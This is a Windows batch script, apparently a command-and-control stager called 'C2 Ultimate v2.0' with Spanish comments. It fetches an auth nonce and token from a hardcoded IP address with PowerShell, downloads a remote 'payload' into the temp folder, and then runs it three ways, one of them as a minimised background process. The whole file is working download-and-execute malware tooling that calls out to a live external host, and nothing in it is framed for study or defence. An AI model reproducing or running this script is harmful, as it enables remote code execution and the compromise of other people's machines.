@echo off
setlocal EnableDelayedExpansion
chcp 65001 >nul
title C2 Ultimate v2.0 - FIXED

echo.
echo [INFO] 🔥 C2 ULTIMATE v2.0 - FIXED EXECUTION 🔥

set "BASE=http://82.29.153.101:8080"
set "AUTH=%TEMP%\auth.json"
set "PAYLOAD=%TEMP%\payload.bat"
set "LOG=%TEMP%\c2_exec.log"

:: [1] AUTH (sin cambios - perfecto)
powershell -NoProfile -Command ^
 "$c=iwr '%BASE%/auth/key' -UseBasicParsing; ^
  $c.nonce | Out-File '%TEMP%\n.txt' ASCII; ^
  $c.token | Out-File '%TEMP%\t.txt' ASCII"

set /p NONCE=<"%TEMP%\n.txt" & set /p TOKEN=<"%TEMP%\t.txt"
del "%TEMP%\n.txt" "%TEMP%\t.txt" 2>nul

echo [DEBUG] AUTH ✓

:: [2] DOWNLOAD CRUDO (UTF8 preservado)
powershell -NoProfile -Command ^
 "$h=@{ 'X-Nonce'='%NONCE%'; 'X-Token'='%TOKEN%' }; ^
  iwr '%BASE%/payload/encrypted' -Headers $h -OutFile '%PAYLOAD%' -UseBasicParsing"

if not exist "%PAYLOAD%" goto :fail

:: [3] PREVIEW SOLO (sin limpieza destructiva)
echo [INFO] PAYLOAD:
type "%PAYLOAD%"
echo.

:: [4] EJECUCIÓN REAL - 3 MÉTODOS LEGÍTIMOS
echo [INFO] 🔥 EJECUTANDO (3x real execution) 🔥

:: MÉTODO 1: CALL DIRECTO (scripts completos)
echo 🔥 METHOD 1: call "%PAYLOAD%"
call "%PAYLOAD%" 

:: MÉTODO 2: CMD /C (contexto limpio)
echo 🔥 METHOD 2: cmd /c "%PAYLOAD%"
cmd /c "%PAYLOAD%"

:: MÉTODO 3: START MINIMIZED (background real)
echo 🔥 METHOD 3: start /min cmd /c "%PAYLOAD%"
start /min cmd /c "%PAYLOAD%"

echo.
echo [SUCCESS] 🎉 3 EJECUCIONES REALES COMPLETADAS 🎉
echo [INFO] Payload queda: %PAYLOAD%
pause

goto :end

:fail
echo [FAIL] ❌ DOWNLOAD FALLÓ
pause
exit /b 1

:end